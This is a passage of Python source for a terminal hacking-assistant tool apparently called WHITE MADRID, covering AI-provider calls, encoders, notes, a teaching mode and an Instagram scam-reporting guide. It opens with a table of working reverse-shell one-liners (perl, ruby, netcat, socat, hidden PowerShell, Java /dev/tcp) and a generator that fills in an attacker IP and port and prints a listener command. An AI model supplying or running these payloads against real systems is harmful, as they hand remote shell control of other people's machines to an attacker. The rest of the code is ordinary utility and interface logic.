    "perl":     "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "ruby":     "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",{port});loop{cmd=c.gets;c.print(cmd.chomp!||cmd)}'",
    "nc":       "nc -e /bin/sh {ip} {port}",
    "nc2":      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "socat":    "socat TCP:{ip}:{port} EXEC:/bin/sh",
    "powershell":"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"",
    "java":     "r = Runtime.getRuntime();p = r.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5|while read line; do \\$line 2>&5 >&5; done\"});p.waitFor();",
}

def gen_payload(ip, port, shell_type="bash"):
    st = shell_type.lower()
    if st not in SHELL_PAYLOADS:
        print()
        _wm_say(f"Unknown type. Available: {', '.join(SHELL_PAYLOADS.keys())}", col=C.RED)
        print(); return
    payload = SHELL_PAYLOADS[st].replace("{ip}",ip).replace("{port}",str(port))
    print()
    _wm_say(f"Reverse shell payload — {st.upper()} → {ip}:{port}", col=C.GREEN)
    print(c(C.GRAY,"  ┌─[payload]"+"─"*40))
    print(c(C.CYAN,f"  │ {payload}"))
    print(c(C.GRAY,"  └"+"─"*50))
    _wm_say(f"Set up listener first: nc -lvnp {port}", col=C.YELLOW, delay=SPEED_FAST)
    print()

def encode_decode(data, mode):
    print()
    try:
        if mode=="b64e":
            out = base64.b64encode(data.encode()).decode()
            _wm_say(f"Base64 encoded:", col=C.GREEN)
        elif mode=="b64d":
            out = base64.b64decode(data.encode()).decode()
            _wm_say(f"Base64 decoded:", col=C.GREEN)
        elif mode=="urlenc":
            out = urllib.parse.quote(data)
            _wm_say(f"URL encoded:", col=C.GREEN)
        elif mode=="urldec":
            out = urllib.parse.unquote(data)
            _wm_say(f"URL decoded:", col=C.GREEN)
        elif mode=="hex":
            out = data.encode().hex()
            _wm_say(f"Hex encoded:", col=C.GREEN)
        elif mode=="unhex":
            out = bytes.fromhex(data).decode()
            _wm_say(f"Hex decoded:", col=C.GREEN)
        elif mode=="md5":
            out = hashlib.md5(data.encode()).hexdigest()
            _wm_say(f"MD5 hash:", col=C.GREEN)
        elif mode=="sha1":
            out = hashlib.sha1(data.encode()).hexdigest()
            _wm_say(f"SHA-1 hash:", col=C.GREEN)
        elif mode=="sha256":
            out = hashlib.sha256(data.encode()).hexdigest()
            _wm_say(f"SHA-256 hash:", col=C.GREEN)
        else:
            _wm_say("Unknown mode. Use: b64e b64d urlenc urldec hex unhex md5 sha1 sha256", col=C.RED)
            print(); return
        print(c(C.GRAY,"  ┌─[result]"+"─"*40))
        print(c(C.CYAN,f"  │ {out}"))
        print(c(C.GRAY,"  └"+"─"*50))
    except Exception as e:
        _wm_say(f"Error: {e}", col=C.RED)
    print()

# ══════════════════════════════════════════════════════
#  NOTES SYSTEM
# ══════════════════════════════════════════════════════
def notes_cmd(action, text=""):
    if action in ("add","save"):
        with open(NOTES_FILE,"a") as f:
            f.write(f"[{date_str()} {now_str()}] {text}\n")
        _wm_say(f"Note saved.", col=C.GREEN)
    elif action in ("list","show","ls"):
        if not os.path.exists(NOTES_FILE):
            _wm_say("No notes yet. Use: note add <text>", col=C.GRAY)
        else:
            print()
            print(c(C.CYAN+C.BOLD,"  ── Session Notes ─────────────────────────"))
            with open(NOTES_FILE) as f:
                lines = f.readlines()[-30:]
            for i,line in enumerate(lines,1):
                print(f"  {c(C.GRAY,str(i).rjust(2)+'.')} {line.rstrip()}")
            print()
    elif action in ("clear","del","delete"):
        if os.path.exists(NOTES_FILE): os.remove(NOTES_FILE)
        _wm_say("Notes cleared.", col=C.YELLOW)
    else:
        _wm_say("Usage: note add <text> | note list | note clear", col=C.GRAY)


# ══════════════════════════════════════════════════════
#  INSTAGRAM SCAMMER REPORTER
# ══════════════════════════════════════════════════════
REPORT_CATEGORIES = {
    "1": ("Impersonation",    "Pretending to be someone else / fake celebrity"),
    "2": ("Fraud/Scam",       "Financial scam, fake giveaway, investment fraud"),
    "3": ("Fake Account",     "Bot account, fake identity, purchased followers"),
    "4": ("Spam",             "Mass unsolicited DMs, spam posts"),
    "5": ("Phishing",         "Stealing credentials, fake login pages"),
    "6": ("Counterfeit",      "Selling fake/counterfeit goods"),
    "7": ("Hacked Account",   "Account was hacked and used maliciously"),
}

REPORT_LINKS = {
    "instagram_report": "https://www.instagram.com/accounts/report/",
    "ig_help_impersonation": "https://help.instagram.com/446663175382270",
    "ig_help_hacked": "https://help.instagram.com/368191326593075",
    "ig_help_scam": "https://help.instagram.com/1584460808531468",
    "ftc_report": "https://reportfraud.ftc.gov/",
    "ic3_report": "https://www.ic3.gov/",
    "cybercrime_india": "https://cybercrime.gov.in/",
}

def instagram_reporter():
    """Guide user through reporting and documenting Instagram scammers."""
    clr()
    w = twidth()
    print()
    print(c(C.CYAN+C.BOLD,"  ╔"+"═"*(w-4)+"╗"))
    print(c(C.CYAN+C.BOLD,"  ║")+c(C.WHITE+C.BOLD,"  WHITE MADRID — Instagram Scammer Reporter".center(w-4))+c(C.CYAN+C.BOLD,"║"))
    print(c(C.CYAN+C.BOLD,"  ║")+c(C.GRAY,"  Reports scammers via official channels — legal & effective".center(w-4))+c(C.CYAN+C.BOLD,"║"))
    print(c(C.CYAN+C.BOLD,"  ╚"+"═"*(w-4)+"╝"))
    print()

    _wm_say("This tool documents evidence and guides you through official reporting.",col=C.CYAN)
    _wm_say("Official reports are the most effective way to get accounts taken down.",col=C.GRAY,delay=SPEED_FAST)
    print()

    # Step 1 — Collect account info
    print(c(C.YELLOW+C.BOLD,"  ── STEP 1: Account Information ──────────────────"))
    print()
    try:
        username = input(c(C.GREEN,"  Scammer's Instagram username (@): ")).strip().lstrip("@")
        if not username:
            _wm_say("No username entered. Cancelled.",col=C.YELLOW); return
        profile_url = f"https://www.instagram.com/{username}/"
        account_url = input(c(C.GREEN,"  Any other account URLs (or Enter to skip): ")).strip()
        desc = input(c(C.GREEN,"  Briefly describe the scam: ")).strip()
        victim = input(c(C.GREEN,"  Were you or someone else targeted? (me/other/both): ")).strip()
        amount = input(c(C.GREEN,"  Any money lost? Amount (or Enter to skip): ")).strip()
    except (KeyboardInterrupt,EOFError):
        print(); return

    print()
    print(c(C.YELLOW+C.BOLD,"  ── STEP 2: Scam Type ────────────────────────────"))
    print()
    for num,(cat,desc2) in REPORT_CATEGORIES.items():
        print(f"  {c(C.GREEN+C.BOLD,'['+num+']'):<20} {c(C.WHITE,cat):<22} {c(C.GRAY,desc2)}")
    print()
    try:
        cat_choice = input(c(C.GREEN,"  Select scam type [1-7]: ")).strip()
    except (KeyboardInterrupt,EOFError):
        print(); return

    cat_name = REPORT_CATEGORIES.get(cat_choice,("Unknown",""))[0]

    print()
    print(c(C.YELLOW+C.BOLD,"  ── STEP 3: Evidence Checklist ───────────────────"))
    print()
    evidence_items = [
        "Screenshots of scam messages/posts",
        "Screen recording of the profile",
        "Any payment receipts or transaction IDs",
        "Email addresses used by the scammer",
        "Phone numbers shared by the scammer",
        "Links shared in DMs or posts",
        "Names or aliases used",
    ]
    collected = []
    print(c(C.GRAY,"  Check off what evidence you have (y/n for each):"))
    print()
    for item in evidence_items:
        try:    ans = input(f"  {c(C.CYAN,'›')} {item}? [y/n]: ").strip().lower()
        except: break
        if ans == "y": collected.append(item)

    print()
    print(c(C.YELLOW+C.BOLD,"  ── STEP 4: Report Summary ───────────────────────"))
    print()

    ts = f"{date_str()} {now_str()}"
    print(c(C.GRAY,"  ┌─[SCAMMER REPORT]"+"─"*(w-22)))
    print(c(C.WHITE,f"  │  Generated     : {ts}"))
    print(c(C.WHITE,f"  │  Username      : @{username}"))
    print(c(C.WHITE,f"  │  Profile URL   : {profile_url}"))
    if account_url: print(c(C.WHITE,f"  │  Other URLs    : {account_url}"))
    print(c(C.WHITE,f"  │  Scam Type     : {cat_name}"))
    print(c(C.WHITE,f"  │  Description   : {desc}"))
    print(c(C.WHITE,f"  │  Victim        : {victim}"))
    if amount: print(c(C.RED,  f"  │  Amount Lost   : {amount}"))
    print(c(C.WHITE,f"  │  Evidence ({len(collected)}):"))
    for e in collected: print(c(C.GREEN,f"  │    ✔ {e}"))
    if not collected: print(c(C.YELLOW,"  │    ✘ No evidence collected yet"))
    print(c(C.GRAY,"  └"+"─"*(w-4)))
    print()

    # Save report
    report_path = os.path.expanduser(f"~/.wm_report_{username}_{date_str()}.txt")
    try:
        with open(report_path,"w") as f:
            f.write(f"WHITE MADRID — Instagram Scammer Report\n")
            f.write(f"Generated: {ts}\n")
            f.write(f"{'='*50}\n")
            f.write(f"Username   : @{username}\n")
            f.write(f"Profile    : {profile_url}\n")
            if account_url: f.write(f"Other URLs : {account_url}\n")
            f.write(f"Scam Type  : {cat_name}\n")
            f.write(f"Description: {desc}\n")
            f.write(f"Victim     : {victim}\n")
            if amount: f.write(f"Amount Lost: {amount}\n")
            f.write(f"\nEvidence collected:\n")
            for e in collected: f.write(f"  - {e}\n")
            f.write(f"\nReport Links:\n")
            for k,v in REPORT_LINKS.items(): f.write(f"  {k}: {v}\n")
        _wm_say(f"Report saved → {report_path}",col=C.GREEN)
    except Exception as ex:
        _wm_say(f"Could not save report: {ex}",col=C.YELLOW,delay=SPEED_FAST)

    print()
    print(c(C.YELLOW+C.BOLD,"  ── STEP 5: Submit Official Reports ──────────────"))
    print()
    print(c(C.WHITE+C.BOLD,"  PRIMARY — Report directly on Instagram:"))
    print(c(C.GRAY,  f"    1. Go to: {profile_url}"))
    print(c(C.GRAY,   "    2. Tap the ⋮ menu (three dots) on their profile"))
    print(c(C.GRAY,   "    3. Tap 'Report'"))
    print(c(C.GRAY,   "    4. Select the appropriate category"))
    print(c(C.GRAY,   "    5. Submit — Instagram reviews within 24-48 hours"))
    print()
    print(c(C.WHITE+C.BOLD,"  SECONDARY — Report to authorities if money was lost:"))
    for k,v in REPORT_LINKS.items():
        if k != "instagram_report":
            label = k.replace("_"," ").upper()
            print(f"    {c(C.CYAN,label):<30} {c(C.BLUE,v)}")
    print()
    print(c(C.WHITE+C.BOLD,"  MASS REPORTING TIP:"))
    print(c(C.GRAY,   "    Ask 5-10 trusted people to also report the account."))
    print(c(C.GRAY,   "    Multiple reports from different accounts = faster takedown."))
    print(c(C.GRAY,   "    Share the username in scam-awareness groups for community reports."))
    print()
    _wm_say(f"Report complete for @{username}. Submit on Instagram now.",col=C.GREEN)
    print()

# ══════════════════════════════════════════════════════
#  TEACHING MODE
# ══════════════════════════════════════════════════════
BEGINNER_TOPICS = [
    ("What is penetration testing?",              "learn"),
    ("What is Kali Linux / Termux?",              "learn"),
    ("What is an IP address and how to find mine?","learn"),
    ("What does nmap do? Show me a basic scan",   "recon"),
    ("What is a reverse shell in simple terms?",  "learn"),
    ("How does SQL injection work? Explain simply","web"),
    ("What is privilege escalation for beginners?","exploit"),
    ("How do I set up my first pentest lab?",     "learn"),
    ("What certifications should I get first?",   "learn"),
    ("What is the difference between HTTP and HTTPS?","learn"),
    ("What is a firewall and how does it work?",  "learn"),
    ("Explain XSS to me like I am 10 years old",  "web"),
    ("What tools do I need for CTF competitions?","ctf"),
    ("How do hackers find vulnerabilities?",      "learn"),
    ("What is social engineering?",               "learn"),
]

def teaching_menu(cfg):
    """Interactive teaching mode for newcomers."""
    clr()
    w = twidth()
    print()
    print(c(C.MAGENTA+C.BOLD,"  ╔"+"═"*(w-4)+"╗"))
    print(c(C.MAGENTA+C.BOLD,"  ║")+c(C.WHITE+C.BOLD,"  WHITE MADRID — TEACHING MODE  👨‍💻".center(w-4))+c(C.MAGENTA+C.BOLD,"║"))
    print(c(C.MAGENTA+C.BOLD,"  ║")+c(C.GRAY,"  Patient step-by-step learning for beginners".center(w-4))+c(C.MAGENTA+C.BOLD,"║"))
    print(c(C.MAGENTA+C.BOLD,"  ╚"+"═"*(w-4)+"╝"))
    print()
    was_teaching = cfg.get("teaching_mode",False)
    cfg["teaching_mode"] = True
    save_config(cfg)
    _wm_say("Teaching mode ON. I will explain everything step by step.",col=C.MAGENTA)
    _wm_say("No jargon without explanation. No assumed knowledge.",col=C.GRAY,delay=SPEED_FAST)
    time.sleep(0.2)
    print()
    print(c(C.YELLOW+C.BOLD,"  Choose a beginner topic or type your own question:"))
    print()
    for i,(topic,_) in enumerate(BEGINNER_TOPICS,1):
        print(f"  {c(C.GREEN+C.BOLD,str(i).rjust(2)+'.')} {topic}")
    print()
    print(c(C.GRAY,"  Or type any question. Type 'expert' to exit teaching mode."))
    print()
    return cfg

def toggle_teaching(cfg, on=None):
    """Toggle or set teaching mode."""
    if on is None:
        on = not cfg.get("teaching_mode",False)
    cfg["teaching_mode"] = on
    save_config(cfg)
    if on:
        _wm_say("Teaching mode ON. I will explain everything simply.",col=C.MAGENTA)
        _wm_say("Tip: use 'teach' for the beginner topic menu.",col=C.GRAY,delay=SPEED_FAST)
    else:
        _wm_say("Expert mode ON. Full technical responses restored.",col=C.CYAN)
    print()
    return cfg

# ══════════════════════════════════════════════════════
#  MODEL TESTER — test all providers with a live ping
# ══════════════════════════════════════════════════════
def test_all_models(cfg):
    """Test connectivity for each configured provider."""
    print()
    _wm_say("Testing all configured providers...",col=C.CYAN)
    print()
    TEST_PROMPT = "Reply with exactly: WHITE MADRID ONLINE"
    results = []
    for pid, pd in API_PROVIDERS.items():
        key = get_key(cfg, pid)
        if not key:
            print(f"  {c(C.GRAY,'·')} {c(C.GRAY,pd['name']):<22} {c(C.GRAY,'no key configured')}")
            results.append((pid,pd["name"],"no key",0))
            continue
        sys.stdout.write(f"  {c(C.CYAN,'⟳')} {c(C.WHITE,pd['name']):<22} testing..."); sys.stdout.flush()
        tmp_cfg = dict(cfg)
        tmp_cfg["provider"] = pid
        tmp_cfg["model"]    = pd["default_free"]
        t_start = time.time()
        response, error = query_ai(TEST_PROMPT, tmp_cfg, [], retry=False)
        elapsed = time.time() - t_start
        if error:
            e = error.lower()
            if "no api key" in e:
                status = c(C.GRAY,"no key")
            elif "401" in error or "auth" in e or "key" in e:
                status = c(C.RED,"auth error — check key")
            elif "403" in error or "cloudflare" in e or "1010" in e:
                status = c(C.YELLOW,"blocked (Cloudflare)")
            elif "credits" in e or "quota" in e or "billing" in e:
                status = c(C.YELLOW,"out of credits")
            elif "network" in e or "timeout" in e or "url" in e.lower():
                status = c(C.RED,"network error")
            elif "model" in e or "404" in error:
                status = c(C.YELLOW,"model unavailable")
            else:
                status = c(C.RED,f"error: {error[:40]}")
            print(f"\r  {c(C.RED,'✗')} {c(C.WHITE,pd['name']):<22} {status}")
            results.append((pid,pd["name"],"error",elapsed))
        else:
            latency = f"{elapsed:.1f}s"
            spd = c(C.GREEN,"fast") if elapsed<3 else c(C.YELLOW,"slow") if elapsed<8 else c(C.RED,"very slow")
            print(f"\r  {c(C.GREEN,'✔')} {c(C.WHITE,pd['name']):<22} {c(C.GREEN,'online')} ({latency} — {spd})  model: {c(C.GRAY,tmp_cfg['model'][:30])}")
            results.append((pid,pd["name"],"ok",elapsed))

    print()
    ok_count  = sum(1 for _,_,s,_ in results if s=="ok")
    err_count = sum(1 for _,_,s,_ in results if s=="error")
    nk_count  = sum(1 for _,_,s,_ in results if s=="no key")
    _wm_say(f"Test complete: {c(C.GREEN,str(ok_count)+' online')}  {c(C.RED,str(err_count)+' errors')}  {c(C.GRAY,str(nk_count)+' no key')}",col=C.CYAN)
    if ok_count>0:
        best = min((r for r in results if r[2]=="ok"), key=lambda x:x[3])
        _wm_say(f"Fastest: {c(C.GREEN+C.BOLD,best[1])} ({best[3]:.1f}s) — use: provider {best[0]}",col=C.GREEN,delay=SPEED_FAST)
    print()

# ══════════════════════════════════════════════════════
#  QUICK START — simplified command suggestions
# ══════════════════════════════════════════════════════
def print_quickstart(cfg):
    """Simple quick-start guide for new users."""
    w = twidth()
    op = cfg.get("operator","Operator")
    tm = cfg.get("teaching_mode",False)
    print()
    print(c(C.GREEN+C.BOLD,"  ╔"+"═"*(w-4)+"╗"))
    print(c(C.GREEN+C.BOLD,"  ║")+c(C.WHITE+C.BOLD,f"  WHITE MADRID — Quick Start, {op}".center(w-4))+c(C.GREEN+C.BOLD,"║"))
    print(c(C.GREEN+C.BOLD,"  ╚"+"═"*(w-4)+"╝"))
    print()
    sections = [
        ("🚀 GET STARTED — Just type a question", C.GREEN, [
            ("Ask anything",        "How do I scan a network with nmap?"),
            ("Ask anything",        "Explain SQL injection for beginners"),
            ("Ask anything",        "Give me a reverse shell for Python"),
        ]),
        ("🔑 IF AI IS NOT WORKING", C.YELLOW, [
            ("testmodels",          "Test which providers are online"),
            ("provider groq",       "Switch to Groq — fastest free"),
            ("freemode",            "Use free model automatically"),
            ("setkey groq",         "Add a Groq API key (free)"),
        ]),
        ("📚 LEARNING MODE", C.MAGENTA, [
            ("teach",               "Open beginner topic menu"),
            ("teaching on",         "Turn on step-by-step explanations"),
            ("teaching off",        "Back to expert mode"),
            ("explain <topic>",     "Deep dive on any concept"),
        ]),
        ("🛠 TOOLS", C.CYAN, [
            ("install",             "Install pentesting tools"),
            ("check",               "See which tools are installed"),
            ("payload 10.0.0.1 4444","Generate reverse shell payload"),
            ("hashid <hash>",       "Identify a hash type"),
            ("encode b64e hello",   "Base64 encode a string"),
        ]),
        ("📸 REPORT A SCAMMER", C.RED, [
            ("report",              "Report Instagram scammer (official channels)"),
        ]),
        ("😎 RELAX", C.BLUE, [
            ("relax",               "Games, trivia, jokes, wisdom"),
            ("joke",                "Random hacker joke"),
            ("trivia",              "Security quiz question"),
        ]),
    ]
    for title, col, cmds in sections:
        print(c(col+C.BOLD,f"  {title}"))
        for cmd, desc in cmds:
            print(f"    {c(C.GREEN+C.BOLD,cmd):<28} {c(C.GRAY,desc)}")
        print()
    mode_label = c(C.MAGENTA,"TEACHING ON") if tm else c(C.CYAN,"EXPERT ON")
    pname = API_PROVIDERS.get(cfg.get("provider",DEFAULT_PROVIDER),{}).get("name","?")
    print(c(C.GRAY,f"  Mode: {mode_label}  |  Provider: {c(C.YELLOW,pname)}  |  type 'help' for full reference"))
    print()

# ══════════════════════════════════════════════════════
#  BOOT SEQUENCE
# ══════════════════════════════════════════════════════
def boot_sequence(cfg):
    clr()
    si   = sysinfo()
    w    = twidth()
    prov = cfg.get("provider",DEFAULT_PROVIDER)
    model= cfg.get("model",DEFAULT_MODEL)

    # Phase 1 — Matrix rain
    print()
    _matrix_rain(rows=4,delay=0.030)
    time.sleep(0.08)

    # Phase 2 — Banner line by line
    for line in BANNER.strip("\n").split("\n"):
        sys.stdout.write(c(C.WHITE+C.BOLD,line)+"\n")
        sys.stdout.flush(); time.sleep(0.038)
    print()

    # Phase 3 — Glitch title
    _glitch_text("  WHITE MADRID  v6.0  —  JARVIS EDITION",col=C.GREEN,cycles=8,delay=0.040)
    _glitch_text(f"  DEVELOPER: {DEVELOPER}  |  ETHICAL HACKING AI TERMINAL",col=C.CYAN,cycles=5,delay=0.032)
    print()

    # Phase 4 — Hex dump
    sys.stdout.write(c(C.GRAY,"  [*] Scanning memory map...\n")); sys.stdout.flush()
    time.sleep(0.08)
    for _ in range(4): _hex_dump_line(delay=0.038)
    print()

    # Phase 5 — System profile
    sys.stdout.write(c(C.GRAY,"  [*] Reading system profile...\n")); sys.stdout.flush()
    time.sleep(0.08)
    pname = API_PROVIDERS.get(prov,{}).get("name",prov)
    rows = [
        ("SYSTEM",   si.get("host","device").upper()),
        ("KERNEL",   si.get("kernel","unknown")),
        ("ARCH",     si.get("arch","?").upper()),
        ("PLATFORM", "TERMUX/ANDROID" if is_termux() else "LINUX/MACOS"),
        ("PROVIDER", pname.upper()),
        ("MODEL",    model[:42].upper()),
        ("DEVELOPER",DEVELOPER),
        ("VERSION",  f"{VERSION} — {CODENAME.upper()}"),
    ]
    for key,val in rows:
        sys.stdout.write(f"  {c(C.GRAY,'│')} {c(C.GRAY,key):<12}  {c(C.GREEN,val)}\n")
        sys.stdout.flush(); time.sleep(0.055)
    print()

    # Phase 6 — Progress bars
    tasks = [
        ("AI CORE      ",C.CYAN,   38,0.016),
        ("API REGISTRY ",C.CYAN,   38,0.014),
        ("TOOL MODULES ",C.CYAN,   38,0.015),
        ("JARVIS ENGINE",C.MAGENTA,38,0.013),
        ("ENCRYPTION   ",C.GREEN,  38,0.011),
    ]
    for label,col,width,delay in tasks:
        _progress_bar(label,width=width,col=col,delay=delay)
        time.sleep(0.04)
    print()

    # Phase 7 — Boot log
    _fake_scroll([
        c(C.GRAY, "[  0.001] Kernel interface ready"),
        c(C.GRAY, "[  0.018] Loading AI inference engine..."),
        c(C.GREEN,"[  0.092] Multi-API gateway online (9 providers)"),
        c(C.GRAY, "[  0.148] Tool catalogue mounted — 30 entries"),
        c(C.GREEN,"[  0.231] JARVIS personality module active"),
        c(C.GRAY, "[  0.289] Built-in tools: hash-id, payload-gen, encoder"),
        c(C.GRAY, "[  0.334] Notes system ready"),
        c(C.YELLOW,"[  0.401] Ethical constraints enforced"),
        c(C.GREEN,"[  0.500] WHITE MADRID v6.0 ready — all systems go"),
    ], delay=0.055)
    print()

    # Phase 8 — Final status + greeting
    sep = "═"*(w-4)
    sys.stdout.write(c(C.GREEN,"  "+sep)+"\n"); sys.stdout.flush()
    sessions = cfg.get("session_count",0)
    operator = cfg.get("operator","Operator")
    greeting, period = _get_greeting(operator)
    if sessions==0:
        _scan_line(f"  FIRST BOOT — Welcome, {operator.upper()}. All systems online.",col=C.GREEN,delay=0.017)
    else:
        _scan_line(f"  SESSION #{sessions+1}  |  {date_str()}  {now_str()}  |  {period.upper()}",col=C.GREEN,delay=0.015)
    _type(f"[AUTH] {operator} | {pname} | {model[:30]}",delay=SPEED_FAST,col=C.GRAY,indent="  ")
    sys.stdout.write(c(C.GREEN,"  "+sep)+"\n"); sys.stdout.flush()
    print()
    _wm_say(greeting,col=C.CYAN,delay=SPEED_NORMAL)
    time.sleep(0.12)
    _wm_say("qs (quickstart) · help · apis · teach · report · testmodels · relax",col=C.GRAY,delay=SPEED_FAST)
    _wm_say("Authorized security research only.",col=C.YELLOW,delay=SPEED_FAST)
    print()
    cfg["session_count"] = sessions+1
    save_config(cfg)

# ══════════════════════════════════════════════════════
#  API DISPLAY
# ══════════════════════════════════════════════════════
def print_apis(cfg):
    w=twidth(); cur_prov=cfg.get("provider",DEFAULT_PROVIDER); cur_model=cfg.get("model",DEFAULT_MODEL)
    print()
    print(c(C.CYAN+C.BOLD,"  ╔"+"═"*(w-4)+"╗"))
    print(c(C.CYAN+C.BOLD,"  ║")+c(C.WHITE+C.BOLD,"  WHITE MADRID — AI Provider Registry".center(w-4))+c(C.CYAN+C.BOLD,"║"))
    print(c(C.CYAN+C.BOLD,"  ╠"+"═"*(w-4)+"╣"))
    for pid,pd in API_PROVIDERS.items():
        active  = pid==cur_prov
        has_key = bool(get_key(cfg,pid))
        tag  = c(C.GREEN+C.BOLD," ◀ ACTIVE") if active else ""
        ktag = c(C.GREEN," [KEY ✓]") if has_key else c(C.RED," [NO KEY]")
        print(c(C.CYAN+C.BOLD,"  ║"))
        print(c(C.CYAN+C.BOLD,"  ║")+f"  {c(C.WHITE+C.BOLD,pd['name'])}{tag}{ktag}  {c(C.GRAY,pd['notes'])}")
        print(c(C.CYAN+C.BOLD,"  ║")+f"  {c(C.BLUE,'  '+pd['key_url'])}")
        for mid,desc in pd["free"]:
            mk = c(C.GREEN+C.BOLD,"  ▶ ") if (active and mid==cur_model) else "    "
            print(c(C.CYAN+C.BOLD,"  ║")+f"{mk}{c(C.GREEN,mid)}  {c(C.GRAY,desc)}")
        for mid,desc in pd["paid"]:
            print(c(C.CYAN+C.BOLD,"  ║")+f"    {c(C.YELLOW,mid)}  {c(C.GRAY,desc)}")
    print(c(C.CYAN+C.BOLD,"  ║"))
    print(c(C.CYAN+C.BOLD,"  ╚"+"═"*(w-4)+"╝"))
    print()
    print(c(C.GRAY,"  provider <name>  model <name>  setkey <provider>  freemode"))
    print()

def switch_provider(cfg,new_prov):
    if new_prov not in API_PROVIDERS:
        _wm_say(f"Unknown provider '{new_prov}'. Options: {', '.join(API_PROVIDERS.keys())}",col=C.RED); return cfg
    pd=API_PROVIDERS[new_prov]
    cfg["provider"]=new_prov; cfg["model"]=pd["default_free"]; save_config(cfg)
    _wm_say(f"Switched to {pd['name']}. Model: {cfg['model']}",col=C.GREEN)
    if not get_key(cfg,new_prov):
        _wm_say(f"No key set. Run: setkey {new_prov}  |  Get key: {pd['key_url']}",col=C.YELLOW,delay=SPEED_FAST)
    print(); return cfg

def set_free_mode(cfg):
    prov=cfg.get("provider",DEFAULT_PROVIDER)
    pd=API_PROVIDERS.get(prov,{})
    cfg["model"]=pd.get("default_free",DEFAULT_MODEL); save_config(cfg)
    _wm_say(f"Free mode. Model: {cfg['model']}",col=C.GREEN)
    print(); return cfg

# ══════════════════════════════════════════════════════
#  API CALL — Multi-provider with auto-retry
# ══════════════════════════════════════════════════════
TEACHING_PROMPT = """You are WHITE MADRID in TEACHING MODE, a patient cybersecurity tutor for beginners.

TEACHING STYLE:
- Explain everything step by step — assume zero prior knowledge
- Define every technical term you use, in plain English
- Use real-world analogies to explain concepts
- Always show the full command with every flag explained
- After commands, explain what each part does line by line
- Add safety reminders naturally, not as lectures
- Encourage the learner — make it fun and approachable
- Use simple language: short sentences, no jargon without explanation
- Always end with: 💡 TIP: <one beginner-friendly tip>
- End with: ▸ NEXT STEP: <what to learn next>

You are patient, encouraging, and thorough. Never assume knowledge."""

def build_request(prompt, api_key, provider, model, history, operator, teaching=False):
    pd      = API_PROVIDERS[provider]
    fmt     = pd["format"]
    url     = pd["url"]
    sys_msg = (TEACHING_PROMPT if teaching else SYSTEM_PROMPT) + f"\n\nOperator: {operator}."
    headers = {
        "Content-Type":"application/json","Accept":"application/json",
        "Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"identity",
        "User-Agent":"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        "Connection":"keep-alive","Cache-Control":"no-cache","Pragma":"no-cache",
    }
    if pd["auth"]=="bearer":   headers["Authorization"]=f"Bearer {api_key}"
    elif pd["auth"]=="x-api-key": headers["x-api-key"]=api_key
    elif pd["auth"]=="param":  url=url.replace("{model}",model)+f"?key={api_key}"
    headers.update(pd.get("extra",{}))

    if fmt=="openai":
        msgs=[{"role":"system","content":sys_msg}]+list(history[-20:])+[{"role":"user","content":prompt}]
        payload={"model":model,"max_tokens":1024,"messages":msgs,"temperature":0.7}
    elif fmt=="anthropic":
        msgs=list(history[-20:])+[{"role":"user","content":prompt}]
        payload={"model":model,"max_tokens":1024,"system":sys_msg,"messages":msgs}
    elif fmt=="gemini":
        url=pd["url"].replace("{model}",model)+f"?key={api_key}"
        parts=[]
        for h in history[-10:]:
            parts.append({"role":"user" if h["role"]=="user" else "model","parts":[{"text":h["content"]}]})
        parts.append({"role":"user","parts":[{"text":prompt}]})
        payload={"system_instruction":{"parts":[{"text":sys_msg}]},"contents":parts,
                 "generationConfig":{"maxOutputTokens":1024,"temperature":0.7}}
    elif fmt=="cohere":
        ch=[{"role":"USER" if h["role"]=="user" else "CHATBOT","message":h["content"]} for h in history[-20:]]
        payload={"model":model,"message":prompt,"preamble":sys_msg,"chat_history":ch,"max_tokens":1024}
    elif fmt=="hf":
        url=pd["url"].replace("{model}",model)
        payload={"inputs":f"<s>[INST] {sys_msg}\n\n{prompt} [/INST]",
                 "parameters":{"max_new_tokens":512,"temperature":0.7,"return_full_text":False}}
    else:
        msgs=[{"role":"system","content":sys_msg}]+list(history[-20:])+[{"role":"user","content":prompt}]
        payload={"model":model,"max_tokens":1024,"messages":msgs}
    return url,headers,payload

def parse_response(data,fmt):
    try:
        if fmt=="openai":   return data["choices"][0]["message"]["content"]
        elif fmt=="anthropic": return data["content"][0]["text"]
        elif fmt=="gemini":  return data["candidates"][0]["content"]["parts"][0]["text"]
        elif fmt=="cohere":  return data.get("text","")
        elif fmt=="hf":
            if isinstance(data,list): return data[0].get("generated_text","")
            return data.get("generated_text","")
        else: return data["choices"][0]["message"]["content"]
    except Exception as e: return f"[Parse error: {e}]\nRaw: {str(data)[:300]}"

def _decompress(raw):
    """Safe decompression — handles gzip, deflate, plain."""
    try:
        if raw[:2]==bytes([0x1f,0x8b]):
            import gzip as _gz; return _gz.decompress(raw)
    except: pass
    try:
        import zlib as _zl; return _zl.decompress(raw)
    except: pass
    return raw

def _safe_json(raw):
    """Decode bytes to JSON safely."""
    for enc in ("utf-8","utf-8-sig","latin-1"):
        try: return json.loads(raw.decode(enc))
        except: pass
    raise ValueError(f"Cannot decode response: {raw[:80]}")

def _extract_error(e, raw_err):
    """Extract clean error message from HTTP error body."""
    raw_err = _decompress(raw_err)
    try:
        body = raw_err.decode("utf-8",errors="replace")
        data = json.loads(body)
        # Try multiple error field shapes across providers
        for path in [
            lambda d: d["error"]["message"],
            lambda d: d["error"],
